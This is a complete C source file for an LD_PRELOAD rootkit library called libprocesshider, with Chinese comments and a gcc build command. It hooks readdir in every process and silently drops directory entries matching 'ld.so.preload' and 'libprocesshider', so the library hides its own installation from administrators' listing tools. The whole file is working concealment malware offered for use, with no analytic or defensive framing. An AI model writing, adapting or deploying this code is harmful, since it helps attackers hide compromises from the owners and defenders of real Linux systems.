/* =============================================================
 *  libprocesshider.so
 *  通过 LD_PRELOAD 注入到每个进程,劫持 readdir,
 *  隐藏 ld.so.preload、libprocesshider.so 等敏感关键字。
 *  编译: gcc -shared -fPIC -nostartfiles -o libprocesshider.so preload.c -ldl
 * ============================================================= */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>

/* 关键:第一次调用 readdir 之前完成 dlsym 解析 */
typedef struct dirent *(*readdir_t)(DIR *);
static readdir_t orig_readdir = NULL;

/* 要隐藏的关键字,出现即过滤 */
static const char *hide_keywords[] = {
    "ld.so.preload",
    "libprocesshider",
    NULL,
};

__attribute__((constructor))
static void _init(void) {
    orig_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
    if (!orig_readdir) {
        /* 失败也别崩,直接返回 NULL,目标进程最多 ls 失败 */
        fprintf(stderr, "libprocesshider: dlsym(readdir) failed\n");
    }
}

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) return NULL;

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        int hide = 0;
        for (int i = 0; hide_keywords[i]; ++i) {
            if (strstr(entry->d_name, hide_keywords[i])) {
                hide = 1;
                break;
            }
        }
        if (!hide) return entry;
    }
    return NULL;
}
